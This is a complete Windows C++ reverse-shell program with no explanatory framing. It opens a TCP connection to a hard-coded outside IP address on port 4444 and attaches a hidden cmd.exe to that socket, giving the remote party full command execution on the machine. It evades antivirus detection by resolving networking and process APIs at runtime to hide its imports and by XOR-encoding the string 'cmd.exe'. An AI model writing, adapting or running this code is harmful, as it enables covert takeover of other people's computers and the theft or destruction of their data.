#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

int main()
{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Dynamic resolution to hide imports
    auto pWSASocketA = (SOCKET(WSAAPI *)(int, int, int, LPWSAPROTOCOL_INFOA, DWORD, DWORD))
        GetProcAddress(GetModuleHandleA("ws2_32.dll"), "WSASocketA");
    auto pConnect = (int(WSAAPI *)(SOCKET, const struct sockaddr *, int))
        GetProcAddress(GetModuleHandleA("ws2_32.dll"), "connect");
    auto pCreateProcessA = (BOOL(WINAPI *)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
        GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
    auto pSend = (int(WSAAPI *)(SOCKET, const char *, int, int))
        GetProcAddress(GetModuleHandleA("ws2_32.dll"), "send");

    SOCKET sock = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = inet_addr("51.20.51.251");

    if (pConnect(sock, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR)
    {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // XOR-obfuscated "cmd.exe"
    char cmd[] = {0x66, 0x68, 0x61, 0x2b, 0x60, 0x7d, 0x60, 0x00};
    for (int i = 0; i < 7; i++)
        cmd[i] ^= 0x05;

    pCreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);

    while (WaitForSingleObject(pi.hProcess, 100) == WAIT_TIMEOUT)
    {
        pSend(sock, "\n", 1, 0);
        Sleep(1000);
    }

    CloseHandle(pi.hProcess);
    closesocket(sock);
    WSACleanup();

    return 0;
}